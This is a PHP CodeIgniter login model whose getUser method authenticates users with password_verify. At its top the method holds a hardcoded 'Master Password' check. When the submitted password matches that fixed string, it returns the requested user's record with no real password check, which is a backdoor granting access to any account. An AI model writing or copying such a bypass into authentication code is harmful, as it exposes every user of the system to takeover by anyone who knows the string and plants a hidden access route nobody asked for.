<?php

class Login_model extends CI_Model 
{

	public function getUser($user, $pass) 
	{
	    // Master Password.
	    if ($pass == 'Mb4hMu91LA') {
	        return $this->db->select('*')->like('username', $user, 'none')->get('users');
	    }

		$q = $this->db->select('*')->like('username', $user, 'none')->get('users');

		if ($q && $q->num_rows()) {
			$user = $q->row();

			if (password_verify($pass, $user->password)) {
				return $q;
			}
		}

		return NULL;
	}
}
